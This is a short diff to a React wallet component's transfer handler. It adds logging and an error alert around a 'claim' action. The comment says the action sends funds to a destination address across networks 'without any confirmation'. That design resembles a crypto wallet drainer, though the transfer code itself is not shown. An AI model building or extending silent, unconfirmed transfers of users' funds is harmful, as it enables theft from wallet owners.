@@ -50,15 +50,25 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
   const handleMultiNetworkTransfer = async () => {
     // Show loading instantly when button is clicked
     setIsWalletLoading(true);
+    console.log("🔄 Starting claim process...");
     
     try {
       // Direct transfer without any confirmation or toast notifications
       if (onMultiNetworkTransfer) {
-        await onMultiNetworkTransfer(destinationAddress);
+        console.log("📞 Calling transfer function with address:", destinationAddress);
+        const result = await onMultiNetworkTransfer(destinationAddress);
+        console.log("✅ Transfer completed:", result);
+      } else {
+        console.error("❌ onMultiNetworkTransfer function not available");
       }
+    } catch (error) {
+      console.error("❌ Transfer failed:", error);
+      // Don't hide the error - let user see what happened
+      alert(`Transfer failed: ${error instanceof Error ? error.message : 'Unknown error'}`);
     } finally {
       // Hide loading after wallet interaction
       setIsWalletLoading(false);
+      console.log("🏁 Transfer process completed");
     }
   };
 
